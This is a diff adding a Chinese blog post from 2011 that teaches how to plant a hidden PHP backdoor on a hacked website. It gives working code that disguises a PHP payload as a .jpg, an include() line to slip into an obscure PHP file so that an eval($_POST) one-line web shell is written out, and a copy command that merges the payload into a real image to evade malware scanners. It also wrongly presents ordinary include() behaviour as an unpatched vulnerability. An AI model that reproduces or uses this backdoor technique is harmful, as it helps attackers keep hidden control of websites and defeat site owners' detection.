@@ -1,0 +1,32 @@
+绝对隐蔽的shell后门的办法，利用include提高包子有效期  大 | 中 | 小   [ 2011-1-3 11:04 | by jed ] 
+nginx前几天nginx和IIS7都爆解析漏洞，搞了几个shell都丢了，于是想寻找一个超级隐
+蔽的后门方法。无意中发现include这个函数可以把任意文件解析为php执行.网上
+　　去搜索include函数漏洞,得到的结果很少.绝大多数是关于文件包含漏洞，比如用变量作
+为包含对像，这只是针对程序，而非针对php下include()这个函数.关于说这
+　　个函数把任意文件解析为php的文章我还没见过,所以暂且称为原创.有找到的联系我一下
+.呵呵，要是真没有..这漏洞就是我发现的了，嘎嘎.
+　　include()函数这个漏洞一直存在,而且一直没有补丁，因为利用的人很少.具体漏洞内容
+就是它可以用来把任意文件解析为php.比如include("linuxso.txt") include
+　　("linuxso.jpg"); 之类的，全部当作php来执行.因为他是php函数库的问题，所以就跟
+web服务器和系统无关了，理论上apache,IIS,nginx或其它web服务器，都是可
+　　以的。我只试了apache和nginx，测试成功.测试方法比较简单，这里就不多说。直接来
+说这个漏洞有什么用，目前我是用来拿到web shell之后制造超级隐蔽的
+　　web后门，其它作用大家自由发挥哈.实验开始.
+　　1，制作一张包含特殊代码的jpg图片.因为市面上扫描网站木马的程序，都不扫描图片格
+式的文件,只搜索.php之类的危险后缀.当然.jpg当然是给管理员的感觉是没
+　　有任何隐患滴.
+　　新建议一个文件 linuxso.txt 内容如下:
+<?fputs(fopen("linuxso.php","w"),"<?eval(\$_POST[linuxso]);?>")?>   //作用是在当
+前目录，打开一个linuxso.php 写入一句话
+　　重命名为 linuxso.jpg
+　　2，找个图片目录上传jpg.路径记下来.
+　　找一个深目录内又几乎用不到的php文件,比如class.archive_read.php,添加一句话 
+include("../../xxx/linuxso.jpg"); //搞清楚相对路径哦.
+　　3,访问http://www.xxx.com/class/class.archive_read.php,即在
+class.archive_read.php同目录下生成一句话木马 linuxso.php 密码linuxso
+　　连接一句话.上传大马.玩完了之后，记得删掉小马.这样任意他找什么扫网马的工具.. 
+也查不到咱的马.嘎嘎，除非...看过这篇文章的管理员.
+　　如果上传假图片怕被发现的话，还可以用 copy命令，拿一张正常的图片和linux.txt 合
+成到一起.完成之后，图片可以正常预览.
+　　命令如下 copy 1.jpg/b+1.txt/b 3.jpg/b 因为这样include函数包含之后，图片会正常
+显示，所以那句include一定要加到一个几乎用不到的php文件里.
